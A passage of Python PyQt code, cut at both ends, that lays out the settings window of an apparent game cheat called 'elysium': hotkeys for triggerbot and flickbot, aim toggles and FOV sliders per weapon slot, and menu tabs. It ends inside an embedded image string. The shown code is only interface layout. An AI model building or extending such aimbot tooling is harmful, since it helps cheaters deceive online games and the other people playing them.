        key_name_converted3 = KEY_NAMES.get(Auto_Fire_Keybind, f"0x{Auto_Fire_Keybind:02X}")
        key_name_converted4 = KEY_NAMES.get(Flickbot_Keybind, f"0x{Flickbot_Keybind:02X}")
        is_selecting_hotkey = False
        self.btn_hotkey = QPushButton(f"{key_name_converted}")
        self.btn_hotkey.setFocusPolicy(Qt.NoFocus)
        self.btn_hotkey.setStyleSheet(self.get_button_style())
        self.btn_hotkey.setMinimumWidth(80)
        self.btn_hotkey.clicked.connect(self.start_select_hotkey)

        is_selecting_hotkey2 = False
        self.btn_hotkey2 = QPushButton(f"{key_name_converted2}")
        self.btn_hotkey2.setFocusPolicy(Qt.NoFocus)
        self.btn_hotkey2.setStyleSheet(self.get_button_style())
        self.btn_hotkey2.setMinimumWidth(80)
        self.btn_hotkey2.clicked.connect(self.start_select_hotkey2)

        self.hotkey_label3 = QLabel("Triggerbot Key")
        is_selecting_hotkey3 = False
        self.btn_hotkey3 = QPushButton(f"{key_name_converted3}")
        self.btn_hotkey3.setFocusPolicy(Qt.NoFocus)
        self.btn_hotkey3.setStyleSheet(self.get_button_style())
        self.btn_hotkey3.setMinimumWidth(80)
        self.btn_hotkey3.clicked.connect(self.start_select_hotkey3)

        self.hotkey_label4 = QLabel("Keybind: ")
        is_selecting_hotkey4 = False
        self.btn_hotkey4 = QPushButton(f"{key_name_converted4}")
        self.btn_hotkey4.setFocusPolicy(Qt.NoFocus)
        self.btn_hotkey4.setStyleSheet(self.get_button_style())
        self.btn_hotkey4.setMinimumWidth(80)
        self.btn_hotkey4.clicked.connect(self.start_select_hotkey4)

# Slots Start
        self.Enable_Aim_Slot1_checkbox = QCheckBox("Aim")
        self.Enable_Aim_Slot1_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Enable_Aim_Slot1_checkbox.setChecked(Enable_Aim_Slot1)

        self.Enable_Aim_Slot2_checkbox = QCheckBox("Aim")
        self.Enable_Aim_Slot2_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Enable_Aim_Slot2_checkbox.setChecked(Enable_Aim_Slot2)

        self.Enable_Aim_Slot3_checkbox = QCheckBox("Aim")
        self.Enable_Aim_Slot3_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Enable_Aim_Slot3_checkbox.setChecked(Enable_Aim_Slot3)

        self.Enable_Aim_Slot4_checkbox = QCheckBox("Aim")
        self.Enable_Aim_Slot4_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Enable_Aim_Slot4_checkbox.setChecked(Enable_Aim_Slot4)

        self.Enable_Aim_Slot5_checkbox = QCheckBox("Aim")
        self.Enable_Aim_Slot5_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Enable_Aim_Slot5_checkbox.setChecked(Enable_Aim_Slot5)

        self.Fov_Size_label_slot1 = QLabel(f"FOV: {str(Fov_Size_Slot1)}")
        self.slider_slot1 = QSlider(Qt.Horizontal)
        self.slider_slot1.setStyleSheet(self.get_slider_style())
        self.slider_slot1.setMaximumWidth(80)
        self.slider_slot1.setMinimumWidth(80)
        self.slider_slot1.setFocusPolicy(Qt.NoFocus)
        self.slider_slot1.setMinimum(120)
        self.slider_slot1.setMaximum(800)
        self.slider_slot1.setValue(int(round(Fov_Size_Slot1)))

        self.Fov_Size_label_slot2 = QLabel(f"FOV: {str(Fov_Size_Slot2)}")
        self.slider_slot2 = QSlider(Qt.Horizontal)
        self.slider_slot2.setStyleSheet(self.get_slider_style())
        self.slider_slot2.setMaximumWidth(80)
        self.slider_slot2.setMinimumWidth(80)
        self.slider_slot2.setFocusPolicy(Qt.NoFocus)
        self.slider_slot2.setMinimum(120)
        self.slider_slot2.setMaximum(800)
        self.slider_slot2.setValue(int(round(Fov_Size_Slot2)))

        self.Fov_Size_label_slot3 = QLabel(f"FOV: {str(Fov_Size_Slot3)}")
        self.slider_slot3 = QSlider(Qt.Horizontal)
        self.slider_slot3.setStyleSheet(self.get_slider_style())
        self.slider_slot3.setMaximumWidth(80)
        self.slider_slot3.setMinimumWidth(80)
        self.slider_slot3.setFocusPolicy(Qt.NoFocus)
        self.slider_slot3.setMinimum(120)
        self.slider_slot3.setMaximum(800)
        self.slider_slot3.setValue(int(round(Fov_Size_Slot3)))

        self.Fov_Size_label_slot4 = QLabel(f"FOV: {str(Fov_Size_Slot4)}")
        self.slider_slot4 = QSlider(Qt.Horizontal)
        self.slider_slot4.setStyleSheet(self.get_slider_style())
        self.slider_slot4.setMaximumWidth(80)
        self.slider_slot4.setMinimumWidth(80)
        self.slider_slot4.setFocusPolicy(Qt.NoFocus)
        self.slider_slot4.setMinimum(120)
        self.slider_slot4.setMaximum(800)
        self.slider_slot4.setValue(int(round(Fov_Size_Slot4)))

        self.Fov_Size_label_slot5 = QLabel(f"FOV: {str(Fov_Size_Slot5)}")
        self.slider_slot5 = QSlider(Qt.Horizontal)
        self.slider_slot5.setStyleSheet(self.get_slider_style())
        self.slider_slot5.setMaximumWidth(80)
        self.slider_slot5.setMinimumWidth(80)
        self.slider_slot5.setFocusPolicy(Qt.NoFocus)
        self.slider_slot5.setMinimum(120)
        self.slider_slot5.setMaximum(800)
        self.slider_slot5.setValue(int(round(Fov_Size_Slot5)))

        key_name_converted_slot1 = KEY_NAMES.get(Slot1_Keybind, f"0x{Slot1_Keybind:02X}")
        self.hotkey_label_slot1 = QLabel("Slot 1")
        is_selecting_hotkey_slot1 = False
        self.btn_hotkey_slot1 = QPushButton(f"{key_name_converted_slot1}")
        self.btn_hotkey_slot1.setFocusPolicy(Qt.NoFocus)
        self.btn_hotkey_slot1.setStyleSheet(self.get_button_style())
        self.btn_hotkey_slot1.setMinimumWidth(40)
        self.btn_hotkey_slot1.clicked.connect(self.start_select_hotkey_slot1)

        key_name_converted_slot2 = KEY_NAMES.get(Slot2_Keybind, f"0x{Slot2_Keybind:02X}")
        self.hotkey_label_slot2 = QLabel("Slot 2")
        is_selecting_hotkey_slot2 = False
        self.btn_hotkey_slot2 = QPushButton(f"{key_name_converted_slot2}")
        self.btn_hotkey_slot2.setFocusPolicy(Qt.NoFocus)
        self.btn_hotkey_slot2.setStyleSheet(self.get_button_style())
        self.btn_hotkey_slot2.setMinimumWidth(40)
        self.btn_hotkey_slot2.clicked.connect(self.start_select_hotkey_slot2)

        key_name_converted_slot3 = KEY_NAMES.get(Slot3_Keybind, f"0x{Slot3_Keybind:02X}")
        self.hotkey_label_slot3 = QLabel("Slot 3")
        is_selecting_hotkey_slot3 = False
        self.btn_hotkey_slot3 = QPushButton(f"{key_name_converted_slot3}")
        self.btn_hotkey_slot3.setFocusPolicy(Qt.NoFocus)
        self.btn_hotkey_slot3.setStyleSheet(self.get_button_style())
        self.btn_hotkey_slot3.setMinimumWidth(40)
        self.btn_hotkey_slot3.clicked.connect(self.start_select_hotkey_slot3)

        key_name_converted_slot4 = KEY_NAMES.get(Slot4_Keybind, f"0x{Slot4_Keybind:02X}")
        self.hotkey_label_slot4 = QLabel("Slot 4")
        is_selecting_hotkey_slot4 = False
        self.btn_hotkey_slot4 = QPushButton(f"{key_name_converted_slot4}")
        self.btn_hotkey_slot4.setFocusPolicy(Qt.NoFocus)
        self.btn_hotkey_slot4.setStyleSheet(self.get_button_style())
        self.btn_hotkey_slot4.setMinimumWidth(40)
        self.btn_hotkey_slot4.clicked.connect(self.start_select_hotkey_slot4)

        key_name_converted_slot5 = KEY_NAMES.get(Slot5_Keybind, f"0x{Slot5_Keybind:02X}")
        self.hotkey_label_slot5 = QLabel("Slot 5")
        is_selecting_hotkey_slot5 = False
        self.btn_hotkey_slot5 = QPushButton(f"{key_name_converted_slot5}")
        self.btn_hotkey_slot5.setFocusPolicy(Qt.NoFocus)
        self.btn_hotkey_slot5.setStyleSheet(self.get_button_style())
        self.btn_hotkey_slot5.setMinimumWidth(40)
        self.btn_hotkey_slot5.clicked.connect(self.start_select_hotkey_slot5)

        key_name_converted_slot6 = KEY_NAMES.get(Slot6_Keybind, f"0x{Slot6_Keybind:02X}")
        self.hotkey_label_slot6 = QLabel("Pickaxe  ")
        is_selecting_hotkey_slot6 = False
        self.btn_hotkey_slot6 = QPushButton(f"{key_name_converted_slot6}")
        self.btn_hotkey_slot6.setFocusPolicy(Qt.NoFocus)
        self.btn_hotkey_slot6.setStyleSheet(self.get_button_style())
        self.btn_hotkey_slot6.setMinimumWidth(40)
        self.btn_hotkey_slot6.clicked.connect(self.start_select_hotkey_slot6)

        button_container = QWidget()
        button_container_layout = QHBoxLayout(button_container)
        btn_aimbot = QPushButton()
        btn_aimbot.setObjectName("menu_tab_aimbot")
        btn_aimbot.setIcon(QIcon(f"C:\\ProgramData\\elysium\\Assets\\Imagess\\skull.png"))
        btn_aimbot.setIconSize(QSize(19, 19))
        btn_aimbot.setFocusPolicy(Qt.NoFocus)
        btn_aimbot.setStyleSheet(self.menu_tab_selected_style())
        btn_slots = QPushButton()
        btn_slots.setObjectName("menu_tab_slots")
        btn_slots.setIcon(QIcon(f"C:\\ProgramData\\elysium\\Assets\\Imagess\\gun.png"))
        btn_slots.setIconSize(QSize(21, 21))
        btn_slots.setFocusPolicy(Qt.NoFocus)
        btn_slots.setStyleSheet(menu_tab_style)
        btn_flickbot = QPushButton()
        btn_flickbot.setIcon(QIcon(f"C:\\ProgramData\\elysium\\Assets\\Imagess\\bullet.png"))
        btn_flickbot.setIconSize(QSize(19, 19))
        btn_flickbot.setObjectName("menu_tab_flickbot")
        btn_flickbot.setFocusPolicy(Qt.NoFocus)
        btn_flickbot.setStyleSheet(menu_tab_style)
        btn_visual = QPushButton()
        btn_visual.setObjectName("menu_tab_visual")
        btn_visual.setIcon(QIcon(f"C:\\ProgramData\\elysium\\Assets\\Imagess\\view.png"))
        btn_visual.setIconSize(QSize(20, 20))
        btn_visual.setFocusPolicy(Qt.NoFocus)
        btn_visual.setStyleSheet(menu_tab_style)
        btn_extra = QPushButton()
        btn_extra.setIcon(QIcon(f"C:\\ProgramData\\elysium\\Assets\\Imagess\\application.png"))
        btn_extra.setIconSize(QSize(19, 19))
        btn_extra.setObjectName("menu_tab_extra")
        btn_extra.setFocusPolicy(Qt.NoFocus)
        btn_extra.setStyleSheet(menu_tab_style)
        btn_profile = QPushButton()
        btn_profile.setIcon(QIcon(f"C:\\ProgramData\\elysium\\Assets\\Imagess\\profile.png"))
        btn_profile.setIconSize(QSize(19, 19))
        btn_profile.setObjectName("menu_tab_profile")
        btn_profile.setFocusPolicy(Qt.NoFocus)
        btn_profile.setStyleSheet(menu_tab_style)
        btn_advanced = QPushButton()
        btn_advanced.setIcon(QIcon(f"C:\\ProgramData\\elysium\\Assets\\Imagess\\brain.png"))
        btn_advanced.setIconSize(QSize(19, 19))
        btn_advanced.setObjectName("menu_tab_advanced")
        btn_advanced.setFocusPolicy(Qt.NoFocus)
        btn_advanced.setStyleSheet(menu_tab_style)
        btn_config = QPushButton()
        btn_config.setIcon(QIcon(f"C:\\ProgramData\\elysium\\Assets\\Imagess\\gear.png"))
        btn_config.setIconSize(QSize(20, 20))
        btn_config.setObjectName("menu_tab_advanced")
        btn_config.setFocusPolicy(Qt.NoFocus)
        btn_config.setStyleSheet(menu_tab_style)
        button_container_layout.addWidget(btn_aimbot)
        button_container_layout.addWidget(btn_slots)
        button_container_layout.addWidget(btn_flickbot)
        button_container_layout.addWidget(btn_visual)
        button_container_layout.addWidget(btn_extra)
        button_container_layout.addWidget(btn_profile)
        button_container_layout.addWidget(btn_advanced)
        #button_container_layout.addWidget(btn_config)
        button_container_layout.setContentsMargins(0, 0, 0, 2)
        self.update_menu_tab_style()

        separator_line = QFrame()
        separator_line.setStyleSheet("background-color: #622298; height: 1px;")
        separator_line.setFrameShape(QFrame.HLine)
        separator_line.setFrameShadow(QFrame.Sunken)
        separator_line1 = QFrame()
        separator_line1.setStyleSheet("background-color: #622298; height: 1px;")
        separator_line1.setFrameShape(QFrame.HLine)
        separator_line1.setFrameShadow(QFrame.Sunken)
        separator_line2 = QFrame()
        separator_line2.setStyleSheet("background-color: #622298; height: 1px;")
        separator_line2.setFrameShape(QFrame.HLine)
        separator_line2.setFrameShadow(QFrame.Sunken)
        separator_line3 = QFrame()
        separator_line3.setStyleSheet("background-color: #622298; height: 1px;")
        separator_line3.setFrameShape(QFrame.HLine)
        separator_line3.setFrameShadow(QFrame.Sunken)
        separator_line4 = QFrame()
        separator_line4.setStyleSheet("background-color: #622298; height: 1px;")
        separator_line4.setFrameShape(QFrame.HLine)
        separator_line4.setFrameShadow(QFrame.Sunken)
        separator_line5 = QFrame()
        separator_line5.setStyleSheet("background-color: #622298; height: 1px;")
        separator_line5.setFrameShape(QFrame.HLine)
        separator_line5.setFrameShadow(QFrame.Sunken)
        separator_line6 = QFrame()
        separator_line6.setStyleSheet("background-color: #622298; height: 1px;")
        separator_line6.setFrameShape(QFrame.HLine)
        separator_line6.setFrameShadow(QFrame.Sunken)
        separator_line7 = QFrame()
        separator_line7.setStyleSheet("background-color: #622298; height: 1px;")
        separator_line7.setFrameShape(QFrame.HLine)
        separator_line7.setFrameShadow(QFrame.Sunken)
        separator_line8 = QFrame()
        separator_line8.setStyleSheet("background-color: #622298; height: 1px;")
        separator_line8.setFrameShape(QFrame.HLine)
        separator_line8.setFrameShadow(QFrame.Sunken)
        separator_line9 = QFrame()
        separator_line9.setStyleSheet("background-color: #622298; height: 1px;")
        separator_line9.setFrameShape(QFrame.HLine)
        separator_line9.setFrameShadow(QFrame.Sunken)

        separator_line10 = QFrame()
        separator_line10.setStyleSheet("background-color: #622298; height: 1px;")
        separator_line10.setFrameShape(QFrame.HLine)
        separator_line10.setFrameShadow(QFrame.Sunken)

        separator_line11 = QFrame()
        separator_line11.setStyleSheet("background-color: #622298; height: 1px;")
        separator_line11.setFrameShape(QFrame.HLine)
        separator_line11.setFrameShadow(QFrame.Sunken)

        separator_line12 = QFrame()
        separator_line12.setStyleSheet("background-color: #622298; height: 1px;")
        separator_line12.setFrameShape(QFrame.HLine)
        separator_line12.setFrameShadow(QFrame.Sunken)

        separator_line13 = QFrame()
        separator_line13.setStyleSheet("background-color: #622298; height: 1px;")
        separator_line13.setFrameShape(QFrame.HLine)
        separator_line13.setFrameShadow(QFrame.Sunken)

        separator_line14 = QFrame()
        separator_line14.setStyleSheet("background-color: #622298; height: 1px;")
        separator_line14.setFrameShape(QFrame.HLine)
        separator_line14.setFrameShadow(QFrame.Sunken)

        # Create the banner layout
        banner_layout = QVBoxLayout()
        self.bannerdd = QLabel(self)
        image_files = [
            #"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